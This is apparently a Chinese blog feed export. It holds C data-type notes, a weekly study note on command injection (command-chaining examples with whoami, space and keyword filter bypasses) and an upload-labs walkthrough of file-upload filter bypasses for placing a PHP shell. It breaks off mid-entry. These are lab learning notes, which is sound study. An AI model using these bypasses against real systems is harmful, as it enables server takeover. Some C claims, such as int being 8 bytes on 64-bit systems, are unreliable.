在32位环境中，各种数据类型的长度(字节)一般如下：</p><ul><li><p>字符型char: 1</p></li><li><p>短整形short: 2</p></li><li><p>整形int: 4</p></li><li><p>长整型long: 4</p></li><li><p>单精度浮点型float: 4</p></li><li><p>双精度浮点型double: 8</p></li></ul><p>数据是放在内存中的，在内存中存取数据要明确三件事情：数据存储在哪里、数据的长度以及数据的处理方式。 变量名不仅仅是为数据起了一个好记的名字，还告诉我们数据存储在哪里，使用数据时，只要提供变量名即可；而数据类型则指明了数据的长度和处理方式。所以诸如int n;、char c;、float money;这样的形式就确定了数据在内存中的所有要素。 C语言提供的多种数据类型让程序更加灵活和高效，同时也增加了学习成本。而有些编程语言，例如：PHP，JavaScript等，在定义变量时不需要指明数据类型，编译器会根据赋值情况自动推演出数据类型，更加智能。 除了C语言，Java、C++、C#,等在定义变量时也必须指明数据类型，这样的编程语言称为强类型语言。</p><p>而PHP、JavaScript等在定义变量时不必指明数据类型，编译系统会自动推演，这样的编程语言称为弱类型语言。 强类型语言一旦确定了数据类型，就不能再赋给其他类型的数据，除非对数据类型进行转换。弱类型语言没有这种限制，一个变量，可以先赋给一个整数，然后再赋给一个字符串。 最后需要说明的是：数据类型只在定义变量时指明，而且必须指明；使用变量时无需再指明，因为此时的数据类型已经确定了。</p><h3 id="C语言中的整数（short-int-long）"><a href="#C语言中的整数（short-int-long）" class="headerlink" title="C语言中的整数（short,int,long）"></a>C语言中的整数（short,int,long）</h3><p>整数是编程中常用的一种数据，C语言通常使用int来定义整数（int 是 integer 的简写）。 在现代操作系统中，int 一般占用 4 个字节（Byte）的内存，共计 32 位（Bit）。如果不考虑正负数，当所有的位都为 1 时它的值最大，为 232-1 &#x3D; 4,294,967,295 ≈ 43亿，这是一个很大的数，实际开发中很少用到，而诸如 1、99、12098 等较小的数使用频率反而较高。 使用 4 个字节保存较小的整数绰绰有余，会空闲出两三个字节来，这些字节就白白浪费掉了，不能再被其他数据使用。现在个人电脑的内存都比较大了，配置低的也有 4G，浪费一些内存不会带来明显的损失；而在C语言被发明的早期，或者在单片机和嵌入式系统中，内存都是非常稀缺的资源，所有的程序都在尽力节省内存。</p><p>反过来说，43 亿虽然已经很大，但要表示全球人口数量还是不够，必须要让整数占用更多的内存，才能表示更大的值，比如占用 6 个字节或者 8 个字节。<br>int 是基本的整数类型，short 和 long 是在 int 的基础上进行的扩展，short 可以节省内存，long 可以容纳更大的值。 short、int、long 是C语言中常见的整数类型，其中 int 称为整型，short 称为短整型，long 称为长整型。<br>整型的长度</p><h3 id="整形的长度"><a href="#整形的长度" class="headerlink" title="整形的长度"></a>整形的长度</h3><p>只有short 的长度是确定的，是两个字节，而 int 和 long 的长度无法确定，在不同的环境下有不同的表现。<br>一种数据类型占用的字节数，称为该数据类型的长度。例如，short 占用 2 个字节的内存，那么它的长度就是 2。<br>实际情况也确实如此，C语言并没有严格规定 short、int、long 的长度，只做了宽泛的限制：</p><ul><li><p>short 至少占用 2 个字节。</p></li><li><p>int 在32 位环境下机器字长为 4 字节，64 位环境下机器字长为 8 字节。</p></li><li><p>short 的长度不能大于 int，long 的长度不能小于 int。</p></li></ul><p>sizeof 用来获取某个数据类型或变量所占用的字节数，如果后面跟的是变量名称，那么可以省略( )，如果跟的是数据类型，就必须带上( )。 需要注意的是，sizeof 是C语言中的操作符，不是函数，所以可以不带( )。</p><h3 id="C语言中的二进制数、八进制数和十六进制数"><a href="#C语言中的二进制数、八进制数和十六进制数" class="headerlink" title="C语言中的二进制数、八进制数和十六进制数"></a>C语言中的二进制数、八进制数和十六进制数</h3><ol><li>二进制<br> 二进制由 0 和 1 两个数字组成，使用时必须以0b或0B（不区分大小写）开头，例如：</li><li>八进制<br> 八进制由 0~7 八个数字组成，使用时必须以0开头（注意是数字 0，不是字母 o），例如：</li><li>十六进制<br> 十六进制由数字 09、字母 AF 或 a~f（不区分大小写）组成，使用时必须以0x或0X（不区分大小写）开头，例如：</li><li>十进制<br> 十进制由 0~9 十个数字组成，没有任何前缀，和我们平时的书写格式一样，不再赘述。</li></ol><h4 id="二进制数、八进制数和十六进制数的输出"><a href="#二进制数、八进制数和十六进制数的输出" class="headerlink" title="二进制数、八进制数和十六进制数的输出"></a>二进制数、八进制数和十六进制数的输出</h4><p>C语言中常用的整数有 short、int 和 long 三种类型，通过 printf 函数，可以将它们以八进制、十进制和十六进制的形式输出。<br>下表列出了不同类型的整数、以不同进制的形式输出时对应的格式控制符：</p><table><thead><tr><th align="left">进制&#x2F;数据类型</th><th align="left">short</th><th align="left">int</th><th align="left">long</th></tr></thead><tbody><tr><td align="left">八进制</td><td align="left">%ho</td><td align="left">%o</td><td align="left">%lo</td></tr><tr><td align="left">十进制</td><td align="left">%hd</td><td align="left">%d</td><td align="left">%ld</td></tr><tr><td align="left">十六进制</td><td align="left">%hx 或者 %hX</td><td align="left">%x 或者 %X</td><td align="left">%lx 或者 %lX</td></tr></tbody></table><p>十六进制数字的表示用到了英文字母，有大小写之分，要在格式控制符中体现出来：</p><ul><li><p>%hx、%x 和 %lx 中的x小写，表明以小写字母的形式输出十六进制数；</p></li><li><p>%hX、%X 和 %lX 中的X大写，表明以大写字母的形式输出十六进制数。<br>八进制数字和十进制数字不区分大小写，所以格式控制符都用小写形式。如果你比较叛逆，想使用大写形式，那么行为是未定义的，请你慎重：</p></li><li><p>有些编译器支持大写形式，只不过行为和小写形式一样；</p></li><li><p>有些编译器不支持大写形式，可能会报错，也可能会导致奇怪的输出。</p></li></ul><h3 id="C语言中的正负数及其输出"><a href="#C语言中的正负数及其输出" class="headerlink" title="C语言中的正负数及其输出"></a>C语言中的正负数及其输出</h3><p>在数学中，数字有正负之分。在C语言中也是一样，short、int、long 都可以带上正负号，例如：<br>如果不带正负号，默认就是正数。 符号也是数字的一部分，也要在内存中体现出来。符号只有正负两种情况，用1位就足以表示；C语言规定，把内存的最高位作为符号位。以 int 为例，它占用 32 位的内存，0~30 位表示数值，31 位表示正负号。</p><p>short、int、long 中就没有符号位了，所有的位都用来表示数值，正数的取值范围更大了。这也意味着，使用了 unsigned 后只能表示正数，不能再表示负数了。 如果将一个数字分为符号和数值两部分，那么不加 unsigned 的数字称为有符号数，能表示正数和负数，加了 unsigned 的数字称为无符号数，只能表示正数。 请读者注意一个小细节，如果是unsigned int类型，那么可以省略 int ，只写 unsigned</p><p>无符号数可以以八进制、十进制和十六进制的形式输出，它们对应的格式控制符分别为：</p><table><thead><tr><th align="left">进制&#x2F;数据类型</th><th align="left">unsigned short</th><th align="left">unsigned int</th><th align="left">unsigned long</th></tr></thead><tbody><tr><td align="left">八进制</td><td align="left">%ho</td><td align="left">%o</td><td align="left">%lo</td></tr><tr><td align="left">十进制</td><td align="left">%hu</td><td align="left">%u</td><td align="left">%lu</td></tr><tr><td align="left">十六进制</td><td align="left">%hx 或者 %hX</td><td align="left">%x 或者 %X</td><td align="left">%lx 或者 %lX</td></tr></tbody></table><h3 id="整数在内存中是如何存储的"><a href="#整数在内存中是如何存储的" class="headerlink" title="整数在内存中是如何存储的"></a>整数在内存中是如何存储的</h3><ol><li>原码<br> 将一个整数转换成二进制形式，就是其原码。<br> 例如short a &#x3D; 6；<br> a的原码就是0000 0000 0000 0110;<br> 更改a的值a &#x3D; -18，此时a的原码就是1000 0000 0001 0010。<br> 通俗的理解，原码就是一个整数本来的二进制形式</li><li>反码<br> 谈到反码，需要将正数和负数区别对待，因为它们的反码不一样。<br> 对于正数，它的反码就是其原码（原码和反码相同）；<br> 负数的反码就是将原码中除符号位以外的所有位（数值位）取反，也就是0变成1,1变成0.。<br> 例如short a &#x3D; 6，a的原码和反码都是0000 0000 0000 0110；<br> 更改a的值a &#x3D; -18，此时a的反码是 1111 1111 1110 1101.</li><li>补码<br> 正数和负数的补码也不一样，也要区别对待。<br> 对于正数，它的补码就是其原码（原码、反码、补码都相同）；<br> 负数的补码是其反码加 1。<br> 例如short a &#x3D; 6;，a 的原码、反码、补码都是0000 0000 0000 0110；<br> 更改 a 的值a &#x3D; -18;，此时 a 的补码是1111 1111 1110 1110。<br>可以认为，补码是在反码的基础上打了一个补丁，进行了一下修正，所以叫“补码”。<br> 原码、反码、补码的概念只对负数有实际意义，对于正数，它们都一样。<br>最后我们总结一下 6 和 -18 从原码到补码的转换过程：</li></ol><p>在计算机内存中，整数一律采用补码的形式来存储。这意味着，当读取整数时还要采用逆向的转换，也就是将补码转换为原码。将补码转换为原码也很简单：先减去 1，再将数值位取反即可。</p><p> 补码到底是如何简化电路的<br>假设 6 和 18 都是 short 类型的，现在我们要计算 6 - 18 的结果，根据运算规则，它等价于 6 + (-18)。<br>如果采用原码计算，那么运算过程为：<br> 6 - 18 &#x3D; 6 + (-18) &#x3D; [0000 0000 0000 0110]原 + [1000 0000 0001 0010]原 &#x3D; [1000 0000 0001 1000]原 &#x3D; -24<br> 直接用原码表示整数，让符号位也参与运算，对于类似上面的减法来说，结果显然是不正确的。<br> 于是人们开始继续探索，不断试错，后来设计出了反码。下面就演示了反码运算的过程：<br> 6 - 18 &#x3D; 6 + (-18) &#x3D; [0000 0000 0000 0110]反 + [1111 1111 1110 1101]反 &#x3D; [1111 1111 1111 0011]反 &#x3D; [1000 0000 0000 1100]原 &#x3D; -12<br> 这样一来，计算结果就正确了。<br>然而，这样还不算万事大吉，我们不妨将减数和被减数交换一下位置，也就是计算 18 - 6 的结果：<br> 18 - 6 &#x3D; 18 + (-6) &#x3D; [0000 0000 0001 0010]反 + [1111 1111 1111 1001]反 &#x3D; [<strong>1</strong> 0000 0000 0000 1011]反 &#x3D; [0000 0000 0000 1011]原 &#x3D; 11<br> 按照反码计算的结果是 11，而真实的结果应该是 12 才对，它们相差了 1。<br>加粗的 1 是加法运算过程中的进位，它溢出了，内存容纳不了了，所以直接截掉。<br> 6 - 18 的结果正确，18 - 6 的结果就不正确，相差 1。按照反码来计算，是不是小数减去大数正确，大数减去小数就不对了，始终相差 1 呢？我们不妨再看两个例子，分别是 5 - 13 和 13 - 5。<br>5 - 13 的运算过程为：<br> 5 - 13 &#x3D; 5 + (-13) &#x3D; [0000 0000 0000 0101]原 + [1000 0000 0000 1101]原 &#x3D; [0000 0000 0000 0101]反 + [1111 1111 1111 0010]反 &#x3D; [1111 1111 1111 0111]反 &#x3D; [1000 0000 0000 1000]原 &#x3D; -8<br> 13 - 5 的运算过程为：<br>13 - 5 &#x3D; 13 + (-5) &#x3D; [0000 0000 0000 1101]原 + [1000 0000 0000 0101]原 &#x3D; [0000 0000 0000 1101]反 + [1111 1111 1111 1010]反 &#x3D; [1 0000 0000 0000 0111]反 &#x3D; [0000 0000 0000 0111]原 &#x3D; 7<br> 这足以证明，刚才的猜想是正确的：小数减去大数不会有问题，而大数减去小数的就不对了，结果始终相差 1。<br> 相差的这个 1 要进行纠正，但是又不能影响小数减去大数，怎么办呢？于是人们又绞尽脑汁设计出了补码，给反码打了一个“补丁”，终于把相差的 1 给纠正过来了。<br> 下面演示了按照补码计算的过程：<br>6 - 18 &#x3D; 6 + (-18) &#x3D; [0000 0000 0000 0110]补 + [1111 1111 1110 1110]补 &#x3D; [1111 1111 1111 0100]补 &#x3D; [1111 1111 1111 0011]反 &#x3D; [1000 0000 0000 1100]原 &#x3D; -12<br> 18 - 6 &#x3D; 18 + (-6) &#x3D; [0000 0000 0001 0010]补 + [1111 1111 1111 1010]补 &#x3D; [1 0000 0000 0000 1100]补 &#x3D; [0000 0000 0000 1100]反 &#x3D; [0000 0000 0000 1100]原 &#x3D; 12<br> 5 - 13 &#x3D; 5 + (-13) &#x3D; [0000 0000 0000 0101]补 + [1111 1111 1111 0011]补 &#x3D; [1111 1111 1111 1000]补 &#x3D; [1000 1111 1111 0111]反 &#x3D; [1000 0000 0000 1000]原 &#x3D; -8<br> 13 - 5 &#x3D; 13 + (-5) &#x3D; [0000 0000 0000 1101]补 + [1111 1111 1111 1011]补 &#x3D; [1 0000 0000 0000 1000]补 &#x3D; [0000 0000 0000 1000]反 &#x3D; [0000 0000 0000 1000]原 &#x3D; 8<br>你看，采用补码的形式正好把相差的 1 纠正过来，也没有影响到小数减去大数，这个“补丁”真是巧妙。<br>小数减去大数，结果为负数，之前（负数从反码转换为补码要加 1）加上的 1，后来（负数从补码转换为反码要减 1）还要减去，正好抵消掉，所以不会受影响。<br> 而大数减去小数，结果为正数，之前（负数从反码转换为补码要加 1）加上的 1，后来（正数的补码和反码相同，从补码转换为反码不用减 1）就没有再减去，不能抵消掉，这就相当于给计算结果多加了一个 1。</p><h3 id="C语言中的小数（float-double）"><a href="#C语言中的小数（float-double）" class="headerlink" title="C语言中的小数（float,double）"></a>C语言中的小数（float,double）</h3><p> 小数分为整数部分和小数部分，它们由点号.分隔，例如 0.0、75.0、4.023、0.27、-937.198 -0.27 等都是合法的小数，这是最常见的小数形式，我们将它称为十进制形式。 此外，小数也可以采用指数形式，例如 7.25×102、0.0368×105、100.22×10-2、-27.36×10-3 等。任何小数都可以用指数形式来表示。 C语言同时支持以上两种形式的小数。但是在书写时，C语言中的指数形式和数学中的指数形式有所差异。 C语言中小数的指数形式为：aEn 或 aen<br> a 为尾数部分，是一个十进制数；n 为指数部分，是一个十进制整数；E或e是固定的字符，用于分割尾数部分和指数部分。整个表达式等价于 a×10n。 指数形式的小数举例：</p><ul><li><p>2.1E5 &#x3D; 2.1×10 5，其中 2.1 是尾数，5 是指数。</p></li><li><p>3.7E-2 &#x3D; 3.7×10-2，其中 3.7 是尾数，-2 是指数。</p></li><li><p>0.5E7 &#x3D; 0.5×10 7，其中 0.5 是尾数，7 是指数。</p></li></ul><h4 id="小数的输出"><a href="#小数的输出" class="headerlink" title="小数的输出"></a>小数的输出</h4><p>小数也可以使用 printf 函数输出，包括十进制形式和指数形式，它们对应的格式控制符分别是：</p><ul><li><p>%f 以十进制形式输出 float 类型；</p></li><li><p>%lf 以十进制形式输出 double 类型；</p></li><li><p>%e 以指数形式输出 float 类型，输出结果中的 e 小写；</p></li><li><p>%E 以指数形式输出 float 类型，输出结果中的 E 大写；</p></li><li><p>%le 以指数形式输出 double 类型，输出结果中的 e 小写；</p></li><li><p>%lE 以指数形式输出 double 类型，输出结果中的 E 大写。</p></li></ul><h3 id="数字的后缀"><a href="#数字的后缀" class="headerlink" title="数字的后缀"></a>数字的后缀</h3><p>一个数字，是有默认类型的：对于整数，默认是 int 类型；对于小数，默认是 double 类型。 请看下面的例子：<br>long a &#x3D; 100;int b &#x3D; 294;float x &#x3D; 52.55;double y &#x3D; 18.6;<br>100 和 294 这两个数字默认都是 int 类型的，将 100 赋值给 a，必须先从 int 类型转换为 long 类型，而将 294 赋值给 b 就不用转换了。 52.55 和 18.6 这两个数字默认都是 double 类型的，将 52.55 赋值给 x，必须先从 double 类型转换为 float 类型，而将 18.6 赋值给 y 就不用转换了。 如果不想让数字使用默认的类型，那么可以给数字加上后缀，手动指明类型：</p><ul><li><p>在整数后面紧跟 l 或者 L（不区分大小写）表明该数字是 long 类型；</p></li><li><p>在小数后面紧跟 f 或者 F（不区分大小写）表明该数字是 float 类型。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记3-RCE,upload-labs,XSS-labs</title>
      <link href="/2023/10/22/%E5%91%A8%E8%AE%B0-2023-10-22-%E5%91%A8%E8%AE%B03/"/>
      <url>/2023/10/22/%E5%91%A8%E8%AE%B0-2023-10-22-%E5%91%A8%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h2 id="rce-命令执行"><a href="#rce-命令执行" class="headerlink" title="rce-命令执行"></a>rce-命令执行</h2><p><img src="https://img-blog.csdnimg.cn/20210720130814355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pZ28xMzQ=,size_16,color_FFFFFF,t_70" alt="1"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。</p><h3 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h3><ol><li>system() 将字符串作为OS命令执行，自带输出功能。</li><li>passthru() 将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li><li>exec() 将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。</li><li>shell_exec() 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。</li><li>popen()&#x2F;proc_open() 该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;&gt; 1.txt&quot;</span>;</span><br><span class="line"> <span class="comment">//此时的$cmd=ipconfig &gt;&gt; 1.txt</span></span><br><span class="line"> <span class="title function_ invoke__">popen</span>(<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//实际上就是 popen(&quot;ipconfig &gt;&gt; 1.txt&quot;, &quot;r&quot;),把执行结果放入1.txt文件，通过访问1.txt文件查看执行结果。</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="6"><li>pcntl_exec() 用的很少不多赘述</li></ol><p>此外php还自带一些能进行命令执行的代码,其中最常见的就是eval()函数</p><p>此函数能将输入的内容当作代码执行</p><p>下面列出一些常用的命令执行手段</p><h3 id="Windows下连接两条命令"><a href="#Windows下连接两条命令" class="headerlink" title="Windows下连接两条命令"></a>Windows下连接两条命令</h3><ul><li>| 直接执行后面的语句，如ping &lt;<a href="http://www.baidu.com|whoami>">www.baidu.com|whoami&gt;</a></li><li>|| 如果前面的语句执行出错，则执行后面的。如ping 2||whoami</li><li>&amp; 前面的语句可真可假。如ping 2&amp;whoami</li><li>&amp;&amp; 前面的语句为真时，才执行后面的语句。如ping &lt;<a href="http://www.baidu.com>">www.baidu.com&gt;</a> &amp;&amp; whoami</li></ul><h3 id="Linux下连接两条命令"><a href="#Linux下连接两条命令" class="headerlink" title="Linux下连接两条命令"></a>Linux下连接两条命令</h3><ul><li>| 管道符，直接执行后面的语句，如ping -c 4 127.0.0.1 | whoami</li><li>|| 如果前面的语句执行出错，则执行后面的。如ping -c 4 2 || whoami</li><li>; 执行完前面的，直接执行后面的；如ping -c 4 127.0.0.1; whoami</li><li>&amp;&amp; 前面的语句为真时，才执行后面的语句。如ping -c 4 127.0.0.1 &amp;&amp; whoami</li></ul><h3 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h3><p>有时题目会对输入内容进行一些限制,即黑名单过滤,我们就要尝试绕过过滤并能实现正常的作用</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>常用${IFS}或者%09替代</p><p>或者可以这样输入:</p><ul><li>{cat,flag}</li><li>cat&lt;flag</li><li>cat&lt;&gt;flag</li></ul><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><ul><li>通配符(如:&#x2F;f*或&#x2F;fl??)</li><li>变量拼接</li><li>反引号</li><li>反斜杠</li><li>引号</li><li>编码绕过(例如url编码:需要get请求传参或base64,Hex编码)</li></ul><h3 id="无参函数RCE"><a href="#无参函数RCE" class="headerlink" title="无参函数RCE"></a>无参函数RCE</h3><p>可以写python脚本输出需要的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输出text取反并url编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">text</span>):</span><br><span class="line">     result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">          temp = <span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="built_in">ord</span>(i))^<span class="number">0xff</span>)</span><br><span class="line">          temp = <span class="built_in">str</span>(temp).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">          result += temp</span><br><span class="line">     <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h2><p>详细内容见我的这篇博客,过程和思路都在这里:</p><p><a href="https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/">https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/</a></p><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>详细内容见我的这篇博客,过程和思路都在这里:</p><p><a href="https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/">https://yantm666.github.io/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/"/>
      <url>/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-upload-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h2><p>一些知识点详见周记2的文件上传部分:<br><a href="https://yantm666.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/">https://yantm666.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</a></p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>第一题简单的前端验证,禁用js传shell或者改合法后缀抓包</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>绕MIME检查,抓包改请求头的Content-Type部分为合法(例如image&#x2F;png)格式绕过</p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>黑名单过滤不全,可以改后缀为能生效但能绕过检测的不常用后缀,如.php3,.php4等</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>没过滤.htaccess后缀,那么可以传此文件使shell图片在后台生效</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>user.ini绕过,上传此文件并上传shell图片,使shell包含进后台自带的php文件中</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>没过滤大小写,可以改后缀为.pHP成功绕过</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>后端检测没有去掉首尾空格，于是上传 shell.php+空格</p><p>那么这样的后缀就能绕过检测</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>源码中没有过滤 .</p><p>上传时文件名为shell.php.，绕过对后缀的检查</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>源码中未对 ::$DATA 过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名</span><br><span class="line">且保持::$DATA之前的文件名，他的目的就是不检查后缀名</span><br><span class="line">例如:&quot;shell.php::$DATA&quot;Windows会自动去掉末尾的::$DATA变成&quot;shell.php&quot;</span><br></pre></td></tr></table></figure><p>上传shell.php::$DATA绕过</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 <span class="title function_ invoke__">deldot</span>() 删除文件名末尾的点</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">deldot</span>() 函数从末尾向前检测，检测到第一个点后，会继续向前检测，但遇到空格会停下来</span><br></pre></td></tr></table></figure><p>可以构造文件名:shell.php. . 绕过检测</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>源码中 使用 str_ireplace 不区分大小写替换，只是替换了一次，我们可以利用双写绕过检查</p><p>上传文件名 ：shell.p.phphp</p><p>上传时会被删除 .php</p><p>最后的上传文件名：shell.php</p><h3 id="Pass-12"><a href="#Pass-12" 